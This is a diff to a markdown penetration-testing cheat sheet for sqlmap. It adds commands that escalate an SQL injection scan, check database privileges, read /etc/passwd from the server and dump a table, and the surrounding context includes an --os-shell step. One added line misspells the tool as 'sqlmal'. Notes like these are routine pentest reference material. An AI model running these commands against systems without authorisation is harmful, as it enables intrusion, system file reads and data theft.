@@ -61,6 +61,23 @@ Start by doing a simple scan without the Time technique:
 	Don't use --batch on the first scan
 	Don't use --threads on the first scan
 
+When increasing the level try it also without the time technique:
+
+```shell
+
+sqlmap -r <request> --technique "BEUSQ" --batch --level 5 --risk 3 --threads 10
+```
+
+Check the priviledges of the db user (we might be able to create a shell or read files):
+
+```shell
+sqlmap -r <request> -p <injectable_parameter> --privileges
+
+#if we have file read privileges we can do so with:
+
+sqlmap -r <request> -p <injectable_parameter> --file-read=/etc/passwd
+```
+
 Try creating a shell after finding an injection
 
 	sqlmap -r <request> --os-shell
@@ -76,6 +93,12 @@ Then add the dbms flag, and enum the dbs, users and roles
 Then pick a db and enum the tables
 
 	sqlmap -r <> --batch --dbms=<> -D <db_name> --tables
+
+Then dump a specific table:
+
+```shell
+sqlmal -r <request> --threads 10 --batch --dbms=<database_magement> -D <database_name> -T <table_name> --dump
+```
 
 ## Sqlmap and websockets
 
